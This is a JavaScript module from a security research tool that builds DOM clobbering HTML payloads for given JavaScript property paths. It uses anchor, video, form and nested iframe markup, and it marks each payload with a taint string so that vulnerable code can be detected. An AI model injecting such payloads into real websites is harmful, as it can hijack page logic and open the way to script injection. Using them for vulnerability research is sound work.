
/*
    Copyright (C) 2022  Soheil Khodayari, CISPA
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.
    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.


    Description:
    ------------
    HTML Payload Generation for Clobbering DOMC Sources
*/



/**
 * DOMClobberingPayloadGenerator
 * @constructor
 */
function DOMClobberingPayloadGenerator() {
    "use strict";
}



/**
 * create_dom_clobbering_html_payload(statement)
 * @method proto
 * @param statement: {
 *		"id": integer
 *		"code": "window.x.y",
 *		"location": {start:{line:1, column:0}, end:{line:10, column:0}}
 *	}
 * @return an object containing (1) the taint value, and (2) the clobbering payload if clobberable, otherwise an empty string.
 */
DOMClobberingPayloadGenerator.prototype.create_dom_clobbering_html_payload = function (statement){

	/*
	at the moment, supports DOMC payloads up to 6 levels, i.e., window.x.y.z.w.value
	*/
	let output = {};
	const taint_value = "TAINT_" + statement.code.replace(/\./g, '_') + '_' + statement.location.start.line + '_' + statement.location.end.line;
	output.taint_value = taint_value;
	output.clobbering_delay = false; // whether script delay is required for the clobbering, e.g., for iframe chains

	const code_variables = statement.code.split('.');
	
	// CASE 1: window.x.y OR x.y
	if(code_variables[0] !== 'document')
	{
		/*
		- up to 2 levels: clobber with HTMLCollections (nodes with same id)
		- three levels & last level is predefined attributes: 
				x.y.src: <video id=x><video id=x name=y src=malicious> (ALSO with <sript>, or <audio>)
				x.y.value: <form id=x><input id=y value=malicious>
				x.y.href = <a id=x><a id=x name=y href=malicious>
		- other cases >= three levels : iframe chains
		*/

		if(code_variables[0] !== 'window')
		{
			// add the window object to the beginning to 
			// handle both the case of `window.x.y` and `x.y`
			// together in one go, rather than having separate checks
			code_variables.unshift('window');
		}
		const code_variables_length = code_variables.length;

		if(code_variables_length === 1){
			const payload = ""; // cannot clobber window alone;
			output.payload = payload;
		}
		else if(code_variables_length === 2)
		{
			// CASE 1.1: window.x
			const payload = `<a id="${code_variables[1]}" href="clobbered:${taint_value}"></a>`;
			output.payload = payload;
		}
		else if(code_variables_length === 3)
		{
			// CASE 1.2: window.x.y
			const payload = `<a id="${code_variables[1]}"></a><a id="${code_variables[1]}" name="${code_variables[2]}" href="clobbered:${taint_value}"></a>`;
			output.payload = payload;
		}
		else if(code_variables_length === 4 && code_variables[3] === 'src')
		{
			// CASE 1.3: window.x.y.src
			const payload = `<video id="${code_variables[1]}"></video><video id="${code_variables[1]}" name="${code_variables[2]}" src="${taint_value}"></video>`;
			output.payload = payload;			
		}
		else if(code_variables_length === 4 && code_variables[3] === 'value')
		{
			// CASE 1.4: window.x.y.value
			const payload = `<form id="${code_variables[1]}"><input type="text" id="${code_variables[2]}" value="${taint_value}"/></form>`;
			output.payload = payload;			
		}
		else if(code_variables_length === 4 && code_variables[3] === 'href')
		{
			// CASE 1.5: window.x.y.href
			const payload = `<a id="${code_variables[1]}"></a><a id="${code_variables[1]}" name="${code_variables[2]}" href="clobbered:${taint_value}"></a>`;
			output.payload = payload;
		}
		else if (code_variables_length === 4) 
		{
			// CASE 1.6: window.x.y.z
			output.clobbering_delay = true;
			const last_src_doc = `<a id=${code_variables[code_variables_length-1]} href=clobbered:${taint_value} ></a>`;
			const payload = `<iframe name="${code_variables[1]}" srcdoc="<iframe name='${code_variables[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
			output.payload = payload
		}
		else if (code_variables_length === 5) 
		{
			// CASE 1.7: window.x.y.z.w
			output.clobbering_delay = true;
			const last_src_doc = `<a id=${code_variables[code_variables_length-2]}></a><a id=${code_variables[code_variables_length-2]} name=${code_variables[code_variables_length-1]} href=clobbered:${taint_value}></a>`;
			const payload = `<iframe name="${code_variables[1]}" srcdoc="<iframe name='${code_variables[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
			output.payload = payload
		}
		else if (code_variables_length === 6 && code_variables[5] === 'href') 
		{
			// CASE 1.8: window.x.y.z.w.href
			output.clobbering_delay = true;
			const last_src_doc = `<a id=${code_variables[code_variables_length-2]}></a><a id=${code_variables[code_variables_length-2]} name=${code_variables[code_variables_length-1]} href=clobbered:${taint_value}></a>`;
			const payload = `<iframe name="${code_variables[1]}" srcdoc="<iframe name='${code_variables[2]}' srcdoc='${last_src_doc}'></iframe>"></iframe>`;
			output.payload = payload
		}
		else
		{
			// no known method to clobber more than six levels
			output.payload="";
		}
		

	} // CASE 2: document.x.y
	else
	{
		const code_variables_length = code_variables.length;
		if(code_variables_length === 1){
			const payload = ""; // cannot clobber document object alone;
			output.payload = payload;
		}
		

	}

	return output;


}



module.exports = {
	DOMClobberingPayloadGenerator: DOMClobberingPayloadGenerator
}






















